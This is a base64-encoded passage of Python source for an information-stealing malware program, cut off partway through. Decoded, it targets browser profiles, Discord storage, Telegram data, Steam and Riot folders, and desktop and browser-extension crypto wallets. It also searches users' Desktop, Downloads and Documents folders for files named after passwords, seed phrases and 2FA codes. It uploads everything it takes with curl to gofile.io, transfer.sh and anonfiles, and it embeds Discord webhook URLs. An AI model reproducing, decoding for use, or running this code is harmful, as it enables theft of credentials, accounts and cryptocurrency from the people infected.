ZiJ7bG9jYWx9L0dvb2dsZS9DaHJvbWUgRGV2L1VzZXIgRGF0YSIsICAgICAgICAgICAgICAgICAgICAiY2hyb21lLmV4ZSIsICAgICAgICIvRGVmYXVsdC9Mb2NhbCBTdG9yYWdlL2xldmVsZGIiLCAgICIvRGVmYXVsdC8iLCAgICAgIi9EZWZhdWx0L05ldHdvcmsiLCAgICAgIi9EZWZhdWx0L0xvY2FsIEV4dGVuc2lvbiBTZXR0aW5ncy8iICAgICAgICAgICAgICBdLA0KICAgICAgICBbZiJ7bG9jYWx9L0dvb2dsZS9DaHJvbWUgVW5zdGFibGUvVXNlciBEYXRhIiwgICAgICAgICAgICAgICAiY2hyb21lLmV4ZSIsICAgICAgICIvRGVmYXVsdC9Mb2NhbCBTdG9yYWdlL2xldmVsZGIiLCAgICIvRGVmYXVsdC8iLCAgICAgIi9EZWZhdWx0L05ldHdvcmsiLCAgICAgIi9EZWZhdWx0L0xvY2FsIEV4dGVuc2lvbiBTZXR0aW5ncy8iICAgICAgICAgICAgICBdLA0KICAgICAgICBbZiJ7bG9jYWx9L0dvb2dsZS9DaHJvbWUgQ2FuYXJ5L1VzZXIgRGF0YSIsICAgICAgICAgICAgICAgICAiY2hyb21lLmV4ZSIsICAgICAgICIvRGVmYXVsdC9Mb2NhbCBTdG9yYWdlL2xldmVsZGIiLCAgICIvRGVmYXVsdC8iLCAgICAgIi9EZWZhdWx0L05ldHdvcmsiLCAgICAgIi9EZWZhdWx0L0xvY2FsIEV4dGVuc2lvbiBTZXR0aW5ncy8iICAgICAgICAgICAgICBdLA0KICAgICAgICBbZiJ7bG9jYWx9L0JyYXZlU29mdHdhcmUvQnJhdmUtQnJvd3Nlci9Vc2VyIERhdGEiLCAgICAgICAgICAiYnJhdmUuZXhlIiwgICAgICAgICIvRGVmYXVsdC9Mb2NhbCBTdG9yYWdlL2xldmVsZGIiLCAgICIvRGVmYXVsdC8iLCAgICAgIi9EZWZhdWx0L05ldHdvcmsiLCAgICAgIi9EZWZhdWx0L0xvY2FsIEV4dGVuc2lvbiBTZXR0aW5ncy8iICAgICAgICAgICAgICBdLA0KICAgICAgICBbZiJ7bG9jYWx9L1ZpdmFsZGkvVXNlciBEYXRhIiwgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAidml2YWxkaS5leGUiLCAgICAgICIvRGVmYXVsdC9Mb2NhbCBTdG9yYWdlL2xldmVsZGIiLCAgICIvRGVmYXVsdC8iLCAgICAgIi9EZWZhdWx0L05ldHdvcmsiLCAgICAgIi9EZWZhdWx0L0xvY2FsIEV4dGVuc2lvbiBTZXR0aW5ncy8iICAgICAgICAgICAgICBdLA0KICAgICAgICBbZiJ7bG9jYWx9L1lhbmRleC9ZYW5kZXhCcm93c2VyL1VzZXIgRGF0YSIsICAgICAgICAgICAgICAgICAieWFuZGV4LmV4ZSIsICAgICAgICIvRGVmYXVsdC9Mb2NhbCBTdG9yYWdlL2xldmVsZGIiLCAgICIvRGVmYXVsdC8iLCAgICAgIi9EZWZhdWx0L05ldHdvcmsiLCAgICAgIi9Ib3VnYUJvdWdhLyIgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBdLA0KICAgICAgICBbZiJ7bG9jYWx9L1lhbmRleC9ZYW5kZXhCcm93c2VyQ2FuYXJ5L1VzZXIgRGF0YSIsICAgICAgICAgICAieWFuZGV4LmV4ZSIsICAgICAgICIvRGVmYXVsdC9Mb2NhbCBTdG9yYWdlL2xldmVsZGIiLCAgICIvRGVmYXVsdC8iLCAgICAgIi9EZWZhdWx0L05ldHdvcmsiLCAgICAgIi9Ib3VnYUJvdWdhLyIgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBdLA0KICAgICAgICBbZiJ7bG9jYWx9L1lhbmRleC9ZYW5kZXhCcm93c2VyRGV2ZWxvcGVyL1VzZXIgRGF0YSIsICAgICAgICAieWFuZGV4LmV4ZSIsICAgICAgICIvRGVmYXVsdC9Mb2NhbCBTdG9yYWdlL2xldmVsZGIiLCAgICIvRGVmYXVsdC8iLCAgICAgIi9EZWZhdWx0L05ldHdvcmsiLCAgICAgIi9Ib3VnYUJvdWdhLyIgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBdLA0KICAgICAgICBbZiJ7bG9jYWx9L1lhbmRleC9ZYW5kZXhCcm93c2VyQmV0YS9Vc2VyIERhdGEiLCAgICAgICAgICAgICAieWFuZGV4LmV4ZSIsICAgICAgICIvRGVmYXVsdC9Mb2NhbCBTdG9yYWdlL2xldmVsZGIiLCAgICIvRGVmYXVsdC8iLCAgICAgIi9EZWZhdWx0L05ldHdvcmsiLCAgICAgIi9Ib3VnYUJvdWdhLyIgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBdLA0KICAgICAgICBbZiJ7bG9jYWx9L1lhbmRleC9ZYW5kZXhCcm93c2VyVGVjaC9Vc2VyIERhdGEiLCAgICAgICAgICAgICAieWFuZGV4LmV4ZSIsICAgICAgICIvRGVmYXVsdC9Mb2NhbCBTdG9yYWdlL2xldmVsZGIiLCAgICIvRGVmYXVsdC8iLCAgICAgIi9EZWZhdWx0L05ldHdvcmsiLCAgICAgIi9Ib3VnYUJvdWdhLyIgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBdLA0KICAgICAgICBbZiJ7bG9jYWx9L1lhbmRleC9ZYW5kZXhCcm93c2VyU3hTL1VzZXIgRGF0YSIsICAgICAgICAgICAgICAieWFuZGV4LmV4ZSIsICAgICAgICIvRGVmYXVsdC9Mb2NhbCBTdG9yYWdlL2xldmVsZGIiLCAgICIvRGVmYXVsdC8iLCAgICAgIi9EZWZhdWx0L05ldHdvcmsiLCAgICAgIi9Ib3VnYUJvdWdhLyIgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBdLA0KICAgIF0NCg0KICAgIGRpc2NvcmRQYXRocyA9IFsNCiAgICAgICAgW2Yie3JvYW1pbmd9L2Rpc2NvcmQiLCAiL0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiJdLA0KICAgICAgICBbZiJ7cm9hbWluZ30vTGlnaHRjb3JkIiwgIi9Mb2NhbCBTdG9yYWdlL2xldmVsZGIiXSwNCiAgICAgICAgW2Yie3JvYW1pbmd9L2Rpc2NvcmRjYW5hcnkiLCAiL0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiJdLA0KICAgICAgICBbZiJ7cm9hbWluZ30vZGlzY29yZHB0YiIsICIvTG9jYWwgU3RvcmFnZS9sZXZlbGRiIl0sDQogICAgXQ0KDQogICAgUGF0aHNUb1ppcCA9IFsNCiAgICAgICAgW2Yie3JvYW1pbmd9L2F0b21pYy9Mb2NhbCBTdG9yYWdlL2xldmVsZGIiLCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIkF0b21pYyBXYWxsZXQuZXhlIiwgICAgICAgICJXYWxsZXQiICAgICAgICBdLA0KICAgICAgICBbZiJ7cm9hbWluZ30vWmNhc2giLCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnIlpjYXNoLmV4ZSInLCAgICAgICAgICAgICAgIldhbGxldCIgICAgICAgIF0sDQogICAgICAgIFtmIntyb2FtaW5nfS9HdWFyZGEvTG9jYWwgU3RvcmFnZS9sZXZlbGRiIiwgICAgICAgICAgICAgICAgICAgICAgICAgICAgICciR3VhcmRhLmV4ZSInLCAgICAgICAgICAgICAiV2FsbGV0IiAgICAgICAgXSwNCiAgICAgICAgW2Yie3JvYW1pbmd9L0NvaW4gV2FsbGV0L0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiIsICAgICAgICAgICAgICAgICAgICAgICAgJyJDb2luIFdhbGxldC5leGUiJywgICAgICAgICJXYWxsZXQiICAgICAgICBdLA0KICAgICAgICBbZiJ7cm9hbWluZ30vQml0Y29pbi93YWxsZXRzIiwgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnIkJpdGNvaW4uZXhlIicsICAgICAgICAgICAgIldhbGxldCIgICAgICAgIF0sDQogICAgICAgIFtmIntyb2FtaW5nfS9XYWxsZXRXYXNhYmkvQ2xpZW50L1dhbGxldHMiLCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICciV2FsbGV0V2FzYWJpLmV4ZSInLCAgICAgICAiV2FsbGV0IiAgICAgICAgXSwNCiAgICAgICAgW2Yie3JvYW1pbmd9L0xpdGVjb2luL3dhbGxldHMiLCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJyJMaXRlY29pbi5leGUiJywgICAgICAgICAgICJXYWxsZXQiICAgICAgICBdLA0KICAgICAgICBbZiJ7cm9hbWluZ30vQXJtb3J5IiwgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnIkFybW9yeS5leGUiJywgICAgICAgICAgICAgIldhbGxldCIgICAgICAgIF0sDQogICAgICAgIFtmIntyb2FtaW5nfS9ieXRlY29pbiIsICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICciYnl0ZWNvaW4uZXhlIicsICAgICAgICAgICAiV2FsbGV0IiAgICAgICAgXSwNCiAgICAgICAgW2Yie3JvYW1pbmd9L0V4b2R1cy9leG9kdXMud2FsbGV0IiwgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIkV4b2R1cy5leGUiLCAgICAgICAgICAgICAgICJXYWxsZXQiICAgICAgICBdLA0KICAgICAgICBbZiJ7cm9hbWluZ30vQmluYW5jZS9Mb2NhbCBTdG9yYWdlL2xldmVsZGIiLCAgICAgICAgICAgICAgICAgICAgICAgICAgICAiQmluYW5jZS5leGUiLCAgICAgICAgICAgICAgIldhbGxldCIgICAgICAgIF0sDQogICAgICAgIFtmIntyb2FtaW5nfS9jb20ubGliZXJ0eS5qYXh4L0luZGV4ZWREQi9maWxlX18wLmluZGV4ZWRkYi5sZXZlbGRiIiwgICAgICciSmF4eC5leGUiJywgICAgICAgICAgICAgICAiV2FsbGV0IiAgICAgICAgXSwNCiAgICAgICAgW2Yie3JvYW1pbmd9L0VsZWN0cnVtL3dhbGxldHMiLCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ0VsZWN0cnVtLmV4ZScsICAgICAgICAgICAgICJXYWxsZXQiICAgICAgICBdLA0KICAgICAgICBbZiJ7cm9hbWluZ30vQ29pbm9taS9Db2lub21pL3dhbGxldHMiLCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnIkNvaW5vbWkuZXhlIicsICAgICAgICAgICAgIldhbGxldCIgICAgICAgIF0sDQogICAgICAgIFsiQzpcUHJvZ3JhbSBGaWxlcyAoeDg2KVxTdGVhbVxjb25maWciLCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJzdGVhbS5leGUiLCAgICAgICAgICAgICAgICAiU3RlYW0iICAgICAgICAgXSwNCiAgICAgICAgW2Yie3JvYW1pbmd9L05hdGlvbnNHbG9yeS9Mb2NhbCBTdG9yYWdlL2xldmVsZGIiLCAgICAgICAgICAgICAgICAgICAgICAgIk5hdGlvbnNHbG9yeS5leGUiLCAgICAgICAgICJOYXRpb25zR2xvcnkiICBdLA0KICAgICAgICBbZiJ7bG9jYWx9L1Jpb3QgR2FtZXMvUmlvdCBDbGllbnQvRGF0YSIsICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiUmlvdENsaWVudFNlcnZpY2VzLmV4ZSIsICAgIlJpb3RDbGllbnQiICAgIF0sDQogICAgXQ0KICAgIFRlbGVncmFtID0gW2Yie3JvYW1pbmd9L1RlbGVncmFtIERlc2t0b3AvdGRhdGEiLCAnVGVsZWdyYW0uZXhlJywgIlRlbGVncmFtIl0NCg0KDQogICAgZm9yIHBhdHQgaW4gYnJvd3NlclBhdGhzOg0KICAgICAgICBTdGFydHRocmVhZChnZXRUb2tlbiwgW3BhdHRbMF0sIHBhdHRbMl1dKQ0KICAgIGZvciBwYXR0IGluIGRpc2NvcmRQYXRoczoNCiAgICAgICAgU3RhcnR0aHJlYWQoR2V0RGlzY29yZCwgW3BhdHRbMF0sIHBhdHRbMV1dKQ0KICAgIFN0YXJ0dGhyZWFkKGdldEJyb3dzZXJzLCBbYnJvd3NlclBhdGhzLF0pDQogICAgU3RhcnR0aHJlYWQoR2F0aGVyWmlwcywgW2Jyb3dzZXJQYXRocywgUGF0aHNUb1ppcCwgVGVsZWdyYW1dKQ0KICAgIFN0YXJ0dGhyZWFkKG5nc3RlYWxlciwgW2Yie3JvYW1pbmd9L05hdGlvbnNHbG9yeS9Mb2NhbCBTdG9yYWdlL2xldmVsZGIiXSkNCg0KICAgIGZvciB0aHJlYWQgaW4gVGhyZWFkbGlzdDoNCiAgICAgICAgdGhyZWFkLmpvaW4oKQ0KDQpkZWYgdXBsb2FkVG9Bbm9uZmlsZXMocGF0aCk6DQogICAgdHJ5Og0KICAgICAgICByID0gc3VicHJvY2Vzcy5Qb3BlbihmImN1cmwgLUYgXCJmaWxlPUB7cGF0aH1cIiBodHRwczovL3tnb2ZpbGVzZXJ2ZXJ9LmdvZmlsZS5pby91cGxvYWRGaWxlIiwgc2hlbGw9VHJ1ZSwgc3Rkb3V0PXN1YnByb2Nlc3MuUElQRSwgc3RkZXJyPXN1YnByb2Nlc3MuUElQRSkuY29tbXVuaWNhdGUoKQ0KICAgICAgICByZXR1cm4ganNvbl9sb2FkcyhyWzBdLmRlY29kZSgndXRmLTgnKSlbImRhdGEiXVsiZG93bmxvYWRQYWdlIl0NCiAgICBleGNlcHQ6DQogICAgICAgIHJldHVybiB1cGxvYWRUb0Fub25maWxlczEocGF0aCkNCg0KZGVmIHVwbG9hZFRvQW5vbmZpbGVzMShwYXRoKToNCiAgICB0cnk6DQogICAgICAgIGNtZCA9IGYiY3VybCAtWCBQVVQgLS11cGxvYWQtZmlsZSB7cGF0aH0gaHR0cHM6Ly90cmFuc2Zlci5zaC97cGF0aH0iDQogICAgICAgIHByb2Nlc3MgPSBzdWJwcm9jZXNzLlBvcGVuKGNtZCwgc2hlbGw9VHJ1ZSwgc3Rkb3V0PXN1YnByb2Nlc3MuUElQRSwgc3RkZXJyPXN1YnByb2Nlc3MuUElQRSkNCiAgICAgICAgc3Rkb3V0LCBzdGRlcnIgPSBwcm9jZXNzLmNvbW11bmljYXRlKCkNCiAgICAgICAgdXJsID0gc3Rkb3V0LmRlY29kZSgndXRmLTgnKS5zdHJpcCgpDQogICAgICAgIHJldHVybiB1cmwNCiAgICBleGNlcHQ6DQogICAgICAgIHJldHVybiB1cGxvYWRUb0Fub25maWxlczIocGF0aCkNCg0KZGVmIHVwbG9hZFRvQW5vbmZpbGVzMihwYXRoKToNCiAgICB0cnk6DQogICAgICAgIHVybCA9ICdodHRwczovL2FwaS5hbm9uZmlsZXMuY29tL3VwbG9hZCcNCiAgICAgICAgY21kID0gZiJjdXJsIC1GIFwiZmlsZT1Ae3BhdGh9XCIge3VybH0iDQogICAgICAgIHByb2Nlc3MgPSBzdWJwcm9jZXNzLlBvcGVuKGNtZCwgc2hlbGw9VHJ1ZSwgc3Rkb3V0PXN1YnByb2Nlc3MuUElQRSwgc3RkZXJyPXN1YnByb2Nlc3MuUElQRSkNCiAgICAgICAgc3Rkb3V0LCBzdGRlcnIgPSBwcm9jZXNzLmNvbW11bmljYXRlKCkNCiAgICAgICAgcmVzcG9uc2UgPSBqc29uLmxvYWRzKHN0ZG91dC5kZWNvZGUoJ3V0Zi04JykpDQogICAgICAgIHJldHVybiByZXNwb25zZVsnZGF0YSddWydmaWxlJ11bJ3VybCddWydzaG9ydCddDQogICAgZXhjZXB0Og0KICAgICAgICByZXR1cm4gRmFsc2UNCg0KZGVmIEtpd2lGb2xkZXIocGF0aEYsIGtleXdvcmRzKToNCiAgICBnbG9iYWwgS2l3aUZpbGVzDQogICAgbWF4ZmlsZXNwZXJkaXIgPSA3DQogICAgaSA9IDANCiAgICBsaXN0T2ZGaWxlID0gb3MubGlzdGRpcihwYXRoRikNCiAgICBmZm91bmQgPSBbXQ0KICAgIGZvciBmaWxlIGluIGxpc3RPZkZpbGU6DQogICAgICAgIGlmIG5vdCBvcy5wYXRoLmlzZmlsZShwYXRoRiArICIvIiArIGZpbGUpOiByZXR1cm4NCiAgICAgICAgaSArPSAxDQogICAgICAgIGlmIGkgPD0gbWF4ZmlsZXNwZXJkaXI6DQogICAgICAgICAgICB1cmwgPSB1cGxvYWRUb0Fub25maWxlcyhwYXRoRiArICIvIiArIGZpbGUpDQogICAgICAgICAgICBmZm91bmQuYXBwZW5kKFtwYXRoRiArICIvIiArIGZpbGUsIHVybF0pDQogICAgICAgIGVsc2U6YnJlYWsNCiAgICBLaXdpRmlsZXMuYXBwZW5kKFsiZm9sZGVyIiwgcGF0aEYgKyAiLyIsIGZmb3VuZF0pDQoNCmRlZiBLaXdpRmlsZShwYXRoLCBrZXl3b3JkcywgZmlsZWVuZGluZ3MpOg0KICAgIGdsb2JhbCBLaXdpRmlsZXMNCiAgICBmaWZvdW5kID0gW10NCiAgICBsaXN0T2ZGaWxlID0gb3MubGlzdGRpcihwYXRoKQ0KICAgIGZvciBmaWxlIGluIGxpc3RPZkZpbGU6DQogICAgICAgIGZvciB3b3JmIGluIGtleXdvcmRzOg0KICAgICAgICAgICAgaWYgd29yZiBpbiBmaWxlLmxvd2VyKCk6DQogICAgICAgICAgICAgICAgaWYgb3MucGF0aC5pc2ZpbGUocGF0aCArICIvIiArIGZpbGUpIGFuZCBmaWxlLmVuZHN3aXRoKHR1cGxlKGZpbGVlbmRpbmdzKSk6DQogICAgICAgICAgICAgICAgICAgIGZpZm91bmQuYXBwZW5kKFtwYXRoICsgIi8iICsgZmlsZSwgdXBsb2FkVG9Bbm9uZmlsZXMocGF0aCArICIvIiArIGZpbGUpXSkNCiAgICAgICAgICAgICAgICAgICAgYnJlYWsNCiAgICAgICAgICAgICAgICBpZiBvcy5wYXRoLmlzZGlyKHBhdGggKyAiLyIgKyBmaWxlKToNCiAgICAgICAgICAgICAgICAgICAgdGFyZ2V0ID0gcGF0aCArICIvIiArIGZpbGUNCiAgICAgICAgICAgICAgICAgICAgS2l3aUZvbGRlcih0YXJnZXQsIGtleXdvcmRzKQ0KICAgICAgICAgICAgICAgICAgICBicmVhaw0KDQogICAgS2l3aUZpbGVzLmFwcGVuZChbImZvbGRlciIsIHBhdGgsIGZpZm91bmRdKQ0KDQpkZWYgS2l3aSgpOg0KICAgIHVzZXIgPSB0ZW1wLnNwbGl0KCJcQXBwRGF0YSIpWzBdDQogICAgcGF0aDJzZWFyY2ggPSBbDQogICAgICAgIHVzZXIgICAgKyAiL0Rlc2t0b3AiLA0KICAgICAgICB1c2VyICAgICsgIi9Eb3dubG9hZHMiLA0KICAgICAgICB1c2VyICAgICsgIi9Eb2N1bWVudHMiLA0KICAgICAgICByb2FtaW5nICsgIi9NaWNyb3NvZnQvV2luZG93cy9SZWNlbnQiLA0KICAgIF0NCg0KICAgIGtleV93b3Jkc0ZvbGRlciA9IFsNCiAgICAgICAgInBhc3N3IiwNCiAgICAgICAgIm1kcCIsDQogICAgICAgICJtb3RkZXBhc3NlIiwNCiAgICAgICAgIm1vdF9kZV9wYXNzZSIsDQogICAgICAgICJsb2dpbiIsDQogICAgICAgICJzZWNyZXQiLA0KICAgICAgICAiYm90IiwNCiAgICAgICAgImF0b21pYyIsDQogICAgICAgICJhY2NvdW50IiwNCiAgICAgICAgImFjb3VudCIsDQogICAgICAgICJwYXlwYWwiLA0KICAgICAgICAiYmFucXVlIiwNCiAgICAgICAgInRva2UiLA0KICAgICAgICAibWV0YW1hc2siLA0KICAgICAgICAid2FsbGV0IiwNCiAgICAgICAgImNyeXB0byIsDQogICAgICAgICJleG9kdXMiLA0KICAgICAgICAiZGlzY29yZCIsDQogICAgICAgICIyZmEiLA0KICAgICAgICAiY29kZSIsDQogICAgICAgICJtZW1vIiwNCiAgICAgICAgImNvbXB0ZSIsDQogICAgICAgICJ0b2tlbiIsDQogICAgICAgICJiYWNrdXAiLA0KICAgICAgICAic2VlZCIsDQogICAgICAgICJtbmVtb25pYyIsDQogICAgICAgICJwcml2YXRlIiwNCiAgICAgICAgImtleSIsDQogICAgICAgICJwYXNzcGhyYXNlIiwNCiAgICAgICAgInBhc3MiLA0KICAgICAgICAicGhyYXNlIiwNCiAgICAgICAgInN0ZWFsIiwNCiAgICAgICAgInBhc3N3b3JkcyIsDQogICAgICAgICJnaXRodWIiLA0KICAgICAgICAibmZ0IiwNCiAgICAgICAgImRyYWluZXIiLA0KICAgICAgICAidG9ybmFkbyINCiAgICBdDQoNCiAgICBrZXlfd29yZHNGaWxlcyA9IFsNCiAgICAgICAgInBhc3N3IiwNCiAgICAgICAgIm1kcCIsDQogICAgICAgICJtb3RkZXBhc3NlIiwNCiAgICAgICAgIm1vdF9kZV9wYXNzZSIsDQogICAgICAgICJsb2dpbiIsDQogICAgICAgICJzZWNyZXQiLA0KICAgICAgICAiYm90IiwNCiAgICAgICAgImF0b21pYyIsDQogICAgICAgICJhY2NvdW50IiwNCiAgICAgICAgImFjb3VudCIsDQogICAgICAgICJwYXlwYWwiLA0KICAgICAgICAiYmFucXVlIiwNCiAgICAgICAgInRva2UiLA0KICAgICAgICAibWV0YW1hc2siLA0KICAgICAgICAid2FsbGV0IiwNCiAgICAgICAgImNyeXB0byIsDQogICAgICAgICJleG9kdXMiLA0KICAgICAgICAiZGlzY29yZCIsDQogICAgICAgICIyZmEiLA0KICAgICAgICAiY29kZSIsDQogICAgICAgICJtZW1vIiwNCiAgICAgICAgImNvbXB0ZSIsDQogICAgICAgICJ0b2tlbiIsDQogICAgICAgICJiYWNrdXAiLA0KICAgICAgICAic2VlZCIsDQogICAgICAgICJtbmVtb25pYyIsDQogICAgICAgICJwcml2YXRlIiwNCiAgICAgICAgImtleSIsDQogICAgICAgICJwYXNzcGhyYXNlIiwNCiAgICAgICAgInBhc3MiLA0KICAgICAgICAicGhyYXNlIiwNCiAgICAgICAgInN0ZWFsIiwNCiAgICAgICAgInBhc3N3b3JkcyIsDQogICAgICAgICJnaXRodWIiLA0KICAgICAgICAibmZ0IiwNCiAgICAgICAgImRyYWluZXIiLA0KICAgICAgICAidG9ybmFkbyINCiAgICBdDQogICAgDQogICAgZmlsZWVuZGluZ3MgPSBbDQogICAgICAgICIudHh0IiwNCiAgICAgICAgIi5kb2MiLA0KICAgICAgICAiLmRvY3giLA0KICAgICAgICAiLnBkZiIsDQogICAgICAgICIuanNvbiIsDQogICAgICAgICIueG1sIiwNCiAgICAgICAgIi5weSIsDQogICAgICAgICIucHljIiwNCiAgICAgICAgIi5wbmciLA0KICAgICAgICAiLmV4ZSIsDQogICAgICAgICIuanMiLA0KICAgICAgICAiLnB5dyINCiAgICBdDQogICAgd2lraXRoID0gW10NCiAgICBmb3IgcGF0dCBpbiBwYXRoMnNlYXJjaDoNCiAgICAgICAga2l3aSA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PUtpd2lGaWxlLCBhcmdzPVtwYXR0LCBrZXlfd29yZHNGaWxlcywgZmlsZWVuZGluZ3NdKQ0KICAgICAgICBraXdpLnN0YXJ0KCkNCiAgICAgICAgd2lraXRoLmFwcGVuZChraXdpKQ0KICAgIHJldHVybiB3aWtpdGgNCg0KDQpnbG9iYWwga2V5d29yZCwgY29va2lXb3JkcywgcGFzd1dvcmRzLCBDb29raUNvdW50LCBQYXNzd0NvdW50LCBXYWxsZXRzWmlwLCBHYW1pbmdaaXAsIE90aGVyWmlwLCBUaHJlYWRsaXN0DQp3ZWJob29rcyA9IFsNCiAgICAiaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTA5Mjg5OTE0MzcxNTkxNzk4NC9NczRrVk5YNUs4UDlSX2hZM1hyZkVoWndULWFQakg5UVNHYjNGaEZvWE80c3BwbUx0aTdxcHJ6X2VOdV9hQ3BocTdpWiIsDQogICAgImh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzEwOTI4OTkxNDg5NzEzOTcxOTMvTHJrNzI1YlBUV0hGT21hZFFuWkhEMDB4ajU1SHEwWFNUQ09fcUM1WHNFc19DclpKYXg0aHd3cnRqV3lSZWF5Rk1TV2wiLA0KICAgICJodHRwczovL2Rpc2NvcmQuY29tL2FwaS93ZWJob29rcy8xMDkyODk5MTUzMDMxNDc1MzMxL2FKd3lHaDQwc3lnc2pUbVNvMW1LeXFIMkZ3eEpfTzk2NmhEbXY0Y3g4LWE3UjFuWnEzV1g4QzhLUEdvZFVxeWthS1IxIg0KXQ0KDQpob29rID0gcmFuZG9tLmNob2ljZSh3ZWJob29rcykNCkRFVEVDVEVEID0gRmFsc2UNCndhbGx0cyA9IFsNCiAgICBbIm5rYmloZmJlb2dhZWFvZWhsZWZua29kYmVmZ3Bna25uIiwgIk1ldGFtYXNrIiAgICAgICAgIF0sDQogICAgWyJlamJhbGJha29wbGNobGdoZWNkYWxtZWVlYWpuaW1obSIsICJNZXRhbWFzayIgICAgICAgICBdLA0KICAgIFsiZmhib2hpbWFlbGJvaHBqYmJsZGNuZ2NuYXBuZG9kanAiLCAiQmluYW5jZSIgICAgICAgICAgXSwNCiAgICBbImhuZmFua25vY2Zlb2ZiZGRnY2lqbm1obmZua2RuYWFkIiwgIkNvaW5iYXNlIiAgICAgICAgIF0sDQogICAgWyJmbmpobWtoaG1rYmpra2FibmRjbm5vZ2Fnb2dibmVlYyIsICJSb25pbiIgICAgICAgICAgICBdLA0KICAgIFsiZWdqaWRqYnBnbGljaGRjb25kYmNiZG5iZWVwcGdkcGgiLCAiVHJ1c3RXYWxsZXQiICAgICAgXSwNCiAgICBbImxkY29vaGVkZmJqb29iY2Fkb2dsbm5tbWZiZGxtbWhmIiwgIkZyYW1lV2FsbGV0IiAgICAgIF0sDQogICAgWyJpYm5lamRmam1ta3BjbmxwZWJrbG1ua29lb2lob2ZlYyIsICJUcm9uIiAgICAgICAgICAgICBdLA0KICAgIFsiZWpqbGFkaW5uY2tkZ2plbWVrZWJkcGVva2Jpa2hmY2kiLCAiUGV0cmEiICAgICAgICAgICAgXSwNCiAgICBbIm9qYmNmaGptcGlnZm9iZmNsZmZsYWZoYmxnZW1laWRpIiwgIkdsb3dfV2FsbGV0IiAgICAgIF0sDQogICAgWyJvcHBjZW9qYXBtZG1ocG5tanBiYWxsYmJkY2xvY2RoaiIsICJBcGV4V2FsbGV0IiAgICAgICBdLA0KICAgIFsiZWZiZ2xnb2ZvaXBwYmdjamVwbmhpYmxhaWJjbmNsZ2siLCAiTWFydGlhbiIgICAgICAgICAgXSwNCiAgICBbInBoa2JhbWVmaW5nZ21ha2drbHBrbGpqbWdpYm9obmJhIiwgIlBvbnRlbSIgICAgICAgICAgIF0sDQogICAgWyJlYmZpZHBwbGhhYmVlZHBuaGpub2JnaG9rcGlpb29saiIsICJGZXdjaGEiICAgICAgICAgICBdLA0KICAgIFsiYWZiY2JqcGJwZmFkbGttaG1jbGhrZWVvZG1hbWNmbGMiLCAiTWF0aCIgICAgICAgICAgICAgXSwNCiAgICBbImFlYWNoa25tZWZwaGVwY2Npb25ib29oY2tvbm9lZW1nIiwgIkNvaW45OCIgICAgICAgICAgIF0sDQogICAgWyJiaGdob2FtYXBjZHBib2hwaGlnb29vYWRkaW5wa2JhaSIsICJBdXRoZW50aWNhdG9yIiAgICBdLA0KICAgIFsiYWhvbHBmZGlhbGpnamZob21paGtqYm1namlkbGNkbm8iLCAiRXhvZHVzV2ViMyIgICAgICAgXSwNCiAgICBbImJmbmFlbG1vbWVpbWhscG1nam5qb3BoaHBra29sanBhIiwgIlBoYW50b20iICAgICAgICAgIF0sDQogICAgWyJhZ29ha2ZlamphYm9tZW1wa2psZXBkZmxhbGVlb2JoYiIsICJDb3JlIiAgICAgICAgICAgICBdLA0KICAgIFsibWZnY2NqY2hpaGZra2luZGZwcG5hb29lY2dmbmVpaWkiLCAiVG9rZW5wb2NrZXQiICAgICAgXSwNCiAgICBbImxnbXBjcGdscG5nZG9hbGJnZW9sZGVhamZjbG5oYWZhIiwgIlNhZmVwYWwiICAgICAgICAgIF0sDQogICAgWyJiaGhobGJlcGRrYmFwYWRqZG5ub2prYmdpb2lvZGJpYyIsICJTb2xmYXJlIiAgICAgICAgICBdLA0KICAgIFsiamJsbmRsaXBlb2dwYWZubGRoZ21hcGFnY2NjZmNocGkiLCAiS2Fpa2FzIiAgICAgICAgICAgXSwNCiAgICBbImtuY2NoZGlnb2JnaGVuYmJhZGRvampubmFvZ2ZwcGZqIiwgImlXYWxsZXQiICAgICAgICAgIF0sDQogICAgWyJmZm5iZWxmZG9laW9oZW5ramlibm1hZGppZWhqaGFqYiIsICJZb3JvaSIgICAgICAgICAgICBdLA0KICAgIFsiaHBnbGZoZ2ZuaGJncGpkZW5qZ21kZ29laWFwcGFmbG4iLCAiR3VhcmRhIiAgICAgICAgICAgXSwNCiAgICBbImNqZWxmcGxwbGViZGpqZW5sbHBqY2JsbWprZmNmZm5lIiwgIkpheHggTGliZXJ0eSIgICAgIF0sDQogICAgWyJhbWttamptbWZsZGRvZ21ocGpsb2ltaXBib2ZuZmppaCIsICJXb21iYXQiICAgICAgICAgICBdLA0KICAgIFsiZmhpbGFoZWltZ2xpZ25kZGtqZ29ma2NiZ2VraGVuYmgiLCAiT3h5Z2VuIiAgICAgICAgICAgXSwNCiAgICBbIm5sYm1ubmlqY25sZWdrampwY2ZqY2xtY2ZnZ2ZlZmRtIiwgIk1FV0NYIiAgICAgICAgICAgIF0sDQogICAgWyJuYW5qbWRrbmhraW5pZm5rZ2RjZ2djZm5oZG